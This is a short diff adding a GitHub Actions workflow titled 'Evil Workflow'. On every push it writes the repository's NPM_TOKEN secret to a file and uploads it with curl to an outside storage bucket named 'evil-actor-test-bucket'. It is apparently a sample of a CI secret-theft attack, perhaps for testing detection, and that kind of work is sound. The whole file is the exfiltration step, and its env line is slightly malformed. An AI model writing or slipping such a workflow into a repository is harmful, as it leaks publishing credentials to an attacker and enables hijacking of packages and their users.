@@ -1,0 +1,13 @@
+name: Evil Workflow
+
+on: push
+
+jobs:
+  reveal-secrets:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo $NPM_TOKEN > evil.txt
+          curl -v --upload-file evil.txt 'https://storage.googleapis.com/evil-actor-test-bucket/evil.txt'
+        env:
+          NPM_TOKEN ${{ secrets.NPM_TOKEN }}
